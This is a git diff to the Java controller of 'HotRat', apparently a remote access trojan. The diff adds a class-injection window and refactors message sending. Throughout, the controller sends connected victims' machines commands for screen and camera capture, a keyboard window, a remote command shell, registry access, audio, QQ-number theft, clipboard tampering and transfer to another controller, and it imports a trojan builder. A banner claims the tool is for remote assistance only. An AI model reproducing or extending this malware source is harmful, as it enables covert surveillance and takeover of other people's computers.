@@ -1,6 +1,7 @@
 package me.server;
 
 import me.server.createtrojan.CreateTrojan;
+import me.server.createtrojan.InjectWindow;
 import me.server.loadconfig.ConfigReader;
 import me.server.loadconfig.ConfigWriter;
 import me.server.loadconfig.SystemSettings;
@@ -32,7 +33,7 @@ public class Server {
     public static String lookandfeel;
     public static String head;
     public static String password;
-    public static final String VERSION = "8";
+    public static final String VERSION = "8.6";
     public static ConfigWriter configWriter = new ConfigWriter();
     static InputStream inputStream12 = Server.class.getClassLoader().getResourceAsStream("me/resources/maintable.png");
     static Image image12;
@@ -47,7 +48,7 @@ public class Server {
     public static void main(String[] args) {
         try {
             File file = new File(CFGPATH);
-            JFrame frame = new JFrame("HotRat "+ VERSION + " |" + " Goodbye, hotrat");
+            JFrame frame = new JFrame("HotRat "+ VERSION);
             if(!file.exists()) {
                 configWriter.write(CFGPATH,"port","8000");
                 configWriter.write(CFGPATH,"head","Nachoneko");
@@ -153,6 +154,7 @@ public class Server {
             JMenuItem jMenuItem9 = new JMenuItem("Smart");
             JMenuItem jMenuItem10 = new JMenuItem("Luna");
             JMenuItem jMenuItem11 = new JMenuItem("HiFi");
+            JMenuItem jMenuItem12 = new JMenuItem("Class Inject");
             frame.add(jScrollPane,BorderLayout.SOUTH);
             defaultTableModel.addRow(new String[]{format.format(date),"欢迎使用HotRat远程协助"});
             defaultTableModel.addRow(new String[]{format.format(date),"本软件仅供于远程协助和远程维护 请勿用于非法用途"});
@@ -164,6 +166,7 @@ public class Server {
             menu.add(jMenuItem2);
             menu.add(jMenuItem7);
             menu.add(jMenuItem8);
+            menu.add(jMenuItem12);
             menu.add(jMenuItem1);
             menu1.add(jMenuItem3);
             menu1.add(jMenuItem4);
@@ -248,6 +251,9 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
+            jMenuItem12.addActionListener(a->{
+                new InjectWindow();
+            });
             jMenuItem5.addActionListener(a->{
                 try {
                     file.delete();
@@ -327,7 +333,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                        SendMessage.SendHead(MessageFlags.SHOW_SCREEN,map.get(str));
+                        SendMessage.sendHead(MessageFlags.SHOW_SCREEN,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -339,8 +345,8 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                        SendMessage.SendHead(MessageFlags.SHOW_FILEWINDOW,map.get(str));
-                        SendMessage.SendHead(MessageFlags.DISK_QUERT,map.get(str));
+                        SendMessage.sendHead(MessageFlags.SHOW_FILEWINDOW,map.get(str));
+                        SendMessage.sendHead(MessageFlags.DISK_QUERT,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -352,7 +358,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                            SendMessage.SendHead(MessageFlags.SHOW_TASKLIST,map.get(str));
+                            SendMessage.sendHead(MessageFlags.SHOW_TASKLIST,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -364,7 +370,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                    SendMessage.SendHead(MessageFlags.SHOW_CAMERA,map.get(str));
+                    SendMessage.sendHead(MessageFlags.SHOW_CAMERA,map.get(str));
                 }).start();
                 }catch (Exception e) {
                 }
@@ -376,7 +382,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                        SendMessage.SendHead(MessageFlags.REGIDTER_WINDOWS_SHOW,map.get(str));
+                        SendMessage.sendHead(MessageFlags.REGIDTER_WINDOWS_SHOW,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -388,7 +394,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                        SendMessage.SendHead(MessageFlags.SHOW_REMOTE_CMD,map.get(str));
+                        SendMessage.sendHead(MessageFlags.SHOW_REMOTE_CMD,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -400,7 +406,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                    SendMessage.SendHead(MessageFlags.SHOW_KEYBORADWINDOW,map.get(str));
+                    SendMessage.sendHead(MessageFlags.SHOW_KEYBORADWINDOW,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -412,7 +418,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                        SendMessage.SendHead(MessageFlags.SHOW_REMOTECHAT,map.get(str));
+                        SendMessage.sendHead(MessageFlags.SHOW_REMOTECHAT,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -424,7 +430,7 @@ public class Server {
                         String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
-                        SendMessage.SendHead(MessageFlags.AUDIO_WINDOWS_SHOW,map.get(str));
+                        SendMessage.sendHead(MessageFlags.AUDIO_WINDOWS_SHOW,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -440,34 +446,43 @@ public class Server {
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                         switch (mode) {
                             case "蜂鸣器":
-                                    SendMessage.SendHead(MessageFlags.BUZZER,map.get(strings));
+                                    SendMessage.sendHead(MessageFlags.BUZZER,map.get(strings));
                                 break;
                             case "远程弹窗":
                                     new MessageBox(map.get(strings));
                                 break;
                             case "远程获取QQ号":
-                                SendMessage.SendHead(MessageFlags.SHOW_QQNUMBERWINDOW,map.get(strings));
+                                SendMessage.sendHead(MessageFlags.SHOW_QQNUMBERWINDOW,map.get(strings));
                                 break;
                             case "剪切板修改":
-                                SendMessage.SendHead(MessageFlags.SHOW_CLIPBORADWINDOW,map.get(strings));
+                                SendMessage.sendHead(MessageFlags.SHOW_CLIPBORADWINDOW,map.get(strings));
                                 break;
                             case "闪屏":
                                     String str =JOptionPane.showInputDialog(null,"闪屏文字..","闪屏",JOptionPane.INFORMATION_MESSAGE);
-                                    SendMessage.Send(MessageFlags.FLASH_SCREEN,str.getBytes(),map.get(strings));
+                                try {
+                                    SendMessage.send(MessageFlags.FLASH_SCREEN,str.getBytes("GBK"),map.get(strings));
+                                } catch (UnsupportedEncodingException e) {
+                                }
                                 break;
                             case "内网映射":
-                                SendMessage.SendHead(MessageFlags.LAN_ACCESS_OPEN,map.get(strings));
+                                SendMessage.sendHead(MessageFlags.LAN_ACCESS_OPEN,map.get(strings));
                                 break;
                             case "网页打开":
                                     String strs =JOptionPane.showInputDialog(null,"输入URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
-                                    SendMessage.Send(MessageFlags.WEB_BROWSE,strs.getBytes(),map.get(strings));
+                                try {
+                                    SendMessage.send(MessageFlags.WEB_BROWSE,strs.getBytes("GBK"),map.get(strings));
+                                } catch (UnsupportedEncodingException e) {
+                                }
                                 break;
                             case "图片展示":
                                 String strs1 =JOptionPane.showInputDialog(null,"输入图片URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
-                                SendMessage.Send(MessageFlags.PICTURE_SHOW,strs1.getBytes(),map.get(strings));
+                                try {
+                                    SendMessage.send(MessageFlags.PICTURE_SHOW,strs1.getBytes("GBK"),map.get(strings));
+                                } catch (UnsupportedEncodingException e) {
+                                }
                                 break;
                             case "关闭图片展示":
-                                SendMessage.SendHead(MessageFlags.PICTURE_CLOSE,map.get(strings));
+                                SendMessage.sendHead(MessageFlags.PICTURE_CLOSE,map.get(strings));
                                 break;
                             case "转移主机":
                                 LoadNewHost.Load(map.get(strings));
@@ -496,7 +511,7 @@ public class Server {
                                 + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                 + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                             JOptionPane.showMessageDialog(null,"解除成功!","解除",JOptionPane.INFORMATION_MESSAGE);
-                            SendMessage.SendHead(MessageFlags.RELIEVE,map.get(str));
+                            SendMessage.sendHead(MessageFlags.RELIEVE,map.get(str));
                     }).start();
                 }catch (Exception e) {
                 }
@@ -505,7 +520,8 @@ public class Server {
             new SendHeartPack(frame,table,defaultListModel).start();
             while (true) {
                 mesocket = socket.accept();
-                executorService.execute(new ClientPage(mesocket,defaultListModel,frame,table));
+                mesocket.setSoLinger(true,0);
+                executorService.execute(new ClientContext(mesocket,defaultListModel,frame,table));
             }
         }catch (Exception e) {
             e.printStackTrace();
@@ -521,64 +537,5 @@ public class Server {
             Object[] contexts = {image12,strings[0],strings[1],strings[2],strings[3],strings[4],strings[5],strings[6],strings[7],strings[8],strings[9]};
             defaultTableModel.addRow(contexts);
         }
-    }
-}
-
-class ClientPage implements Runnable{
-   static Socket mesocket;
-    DefaultTableModel tableModel;
-    JFrame frame;
-    JTable table;
-    public ClientPage(Socket socket,DefaultTableModel tableModel,JFrame frame,JTable table) {
-        mesocket = socket;
-        this.table = table;
-        this.tableModel = tableModel;
-        this.frame = frame;
-    }
-    @Override
-    public void run() {
-        try {
-            DataInputStream dataInputStream = new DataInputStream(mesocket.getInputStream());
-            String str1 = dataInputStream.readUTF();
-            String str2 = dataInputStream.readUTF();
-            String str3 = dataInputStream.readUTF();
-            String str4 = dataInputStream.readUTF();
-            String str5 = dataInputStream.readUTF();
-            String str6 = dataInputStream.readUTF();
-            String str7 = dataInputStream.readUTF();
-            String str8 = dataInputStream.readUTF();
-            String str9 = dataInputStream.readUTF();
-            String str10 = dataInputStream.readUTF();
-            String str11 = dataInputStream.readUTF();
-            if (!str1.contains(Server.head)) {
-                mesocket.close();
-                return;
-            }
-            Date date = new Date();
-            SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
-            SystemDisplay(str2,str3);
-            String[] strings = new String[]{
-                    str2,str3,str4,str5,str6,str7,str8,str9,str10,str11
-            };
-            String context = strings[0] + "$" + strings[1] + "$" + strings[2] + "$" + strings[3] + "$" + strings[4]+ "$" + strings[5]  + "$" + strings[6]
-                    + "$" + strings[7]+ "$" + strings[8] + "$" + strings[9] ;
-            Server.map.put(context, mesocket);
-            Server.flashTable(table, tableModel);
-            PlayMusic.online();
-            Server.defaultTableModel.addRow(new String[]{format.format(date),"主机上线:" + strings[1]});
-            frame.setSize(1101,701);//强制刷新
-            frame.setSize(1100,700);
-            frame.repaint();
-            new ReceiveMessage(mesocket,str5).start();
-        }catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-    public void SystemDisplay(String str,String str2) throws AWTException {
-        SystemTray systemTray = SystemTray.getSystemTray();
-        Image image = Toolkit.getDefaultToolkit().createImage("icon.png");
-        TrayIcon trayIcon = new TrayIcon(image);
-        systemTray.add(trayIcon);
-        trayIcon.displayMessage("新主机上线",str + "\n" + str2, TrayIcon.MessageType.INFO);
     }
 }
